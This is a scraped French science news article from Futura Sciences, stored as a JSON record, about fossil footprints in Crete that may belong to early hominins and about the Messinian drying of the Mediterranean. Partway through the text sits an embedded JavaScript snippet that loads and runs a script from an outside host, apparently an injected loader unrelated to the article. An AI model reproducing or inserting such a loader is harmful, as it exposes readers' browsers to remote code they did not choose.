{"title": "En Crète, des empreintes de pas remettent en cause l'évolution humaine", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "04/09/2017", "content": "De mystérieuses empreintes fossilisées datant de 5,7 millions d'années ont été trouvées en Crète. Selon certains chercheurs, il pourrait s'agir de traces d'hominines. Mais, si tel est bien le cas, il faudrait alors totalement repenser l'origine du genre  Homo .  Ce qu'il faut retenir Une piste, avec ce qui semble être 29 traces de pas, dont les tailles sont comprises entre 9,9 et 22,3 cm de longueur, a été découverte en Crète. Selon les chercheurs à l'origine de cette découverte, ces traces proviendraient de bipèdes et, surtout, de mammifères dont les pieds seraient ceux d’hominines et pas de singes. D'autres chercheurs ne sont pas d'accord. Si tel est bien le cas, étant âgées d'environ 5,7 millions d'années, ces traces pourraient conduire à repenser la chronologie et la structure de l'arbre des hominines menant à  Homo sapiens . Un article publié récemment dans  Proceedings of the Geologists' Association  par les membres d'une équipe internationale de chercheurs (essentiellement des chercheurs polonais en géosciences) fait quelques  vagues  dans le petit monde de la  paléontologie . Elle  porte  sur une découverte dont l'interprétation, si elle venait à être avérée, serait fort intéressante, mais peut-être pas aussi révolutionnaire tout de même (quoique) que la découverte d' Homo naledi  ou que celle des restes fossilisés d' Homo sapiens  primitifs sur le site de Djebel Irhoud, au Maroc. Tout commença en 2002, lorsque le paléontologue polonais Gerard Gierlinski tomba par hasard sur ce qui semblait être des empreintes  fossiles  de  mammifères  dans une couche sédimentaire, lors de ses vacances en Crète. Le chercheur ne revint vraiment sur le site qu'en 2010 ; c'est alors que des recherches plus approfondies débutèrent dans la région de Trachilos, près de la ville de Kissamos, située à l'ouest de l'île. Une véritable piste, avec 29 traces de pas dont les tailles sont comprises entre 9,9 et 22,3 cm de longueur, fut finalement découverte. Or, selon les chercheurs, ces traces proviendraient de bipèdes et, surtout, de mammifères dont les pieds seraient ceux d'hominines, ce qui les rattacherait directement à nous. Le lac Assal est une partie du fond de la mer Rouge mais exondé. Il se trouve sur le territoire de Djibouti. © Lucia Pagano Des hominines qui traversent une Méditerranée à sec ? Les chercheurs ont bien évidemment voulu dater leur trouvaille. Ils ont été aidés en cela par la présence de  foraminifères  dans la  strate  sédimentaire portant les empreintes de pas supputées. Il faut savoir que ces  micro-organismes  marins évoluent avec le temps, ce qui fait d'eux des marqueurs temporels efficaces pour dater une couche dans laquelle ils se trouvent fossilisés. Dans un premier temps, un âge compris entre 8,5 et 3,5 millions d'années fut ainsi obtenu. Ces traces sont donc au moins aussi anciennes que celles de Laetoli, découvertes en Tanzanie en 1978 et qui sont datées d'environ 3,5 millions d'années (très célèbres, elles sont attribuées aux  australopithèques ).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Mais comment diable des hominines primitifs de cette époque, tout juste en train de développer des outils rudimentaires, auraient-ils bien pu traverser la Méditerranée ? C'est oublier un peu vite la fameuse crise de  salinité  messinienne, c'est-à-dire un assèchement important, et peut-être même complet, de cette mer du fait de la fermeture temporaire du détroit de Gibraltar, provoquée par les  mouvements  de la  tectonique des plaques . Transitoire, cet assèchement s'est produit pendant le Messinien, à la fin du  Miocène , il y a 5,96 à 5,33 millions d'années. Or, justement, les études stratigraphiques montrent que la couche trouvée en Crète est proche d'une couche repère bien connue de cet évènement. Nous savons donc que les bipèdes ayant laissé ces traces devaient vivre il y a environ 5,7 millions d'années. Une bonne partie de la Méditerranée ressemblait alors à la  dépression de l’Afar  et le Sahara n'était pas un  désert  mais une savane africaine.  La Crète n'étant alors pas une île, les traces de Trachilos pourraient bien avoir été laissées par des hominines. Mais certains paléoanthropologues le nient sur la base de la structure de ces empreintes qui, hélas, ne sont pas d'une qualité suffisante pour que le débat soit tranché rapidement. Or, jusqu'à présent, les traces d'hominines datant de plus de 2 millions d'années ont toutes été retrouvées en Afrique. Il faudrait donc en conclure que ces hominines auraient pu s'aventurer au-delà plus tôt qu'on ne le pensait. D'ailleurs, c'est bien ce que certains pensent déjà en se basant sur des découvertes de dents appartenant au grécopithèque ( Graecopithecus freybergi ) qui, bien que cela soit débattu, pourraient faire de lui l'ancêtre du genre  Homo , ce qui bouleverserait nos idées sur nos origines. Interview 1/5 : la naissance de l'Homme                       Exercice difficile, déterminer l’origine de l’Homme impose de définir ce qui fait l'identité humaine. L’Homme est-il Homme par sa capacité à marcher ? à parler ? à fabriquer des outils ? Futura-Sciences a posé la question à Silvana Condemi, paléoanthropologue. Découvrez sa réponse en vidéo.                                       ", "theme": "sciences"}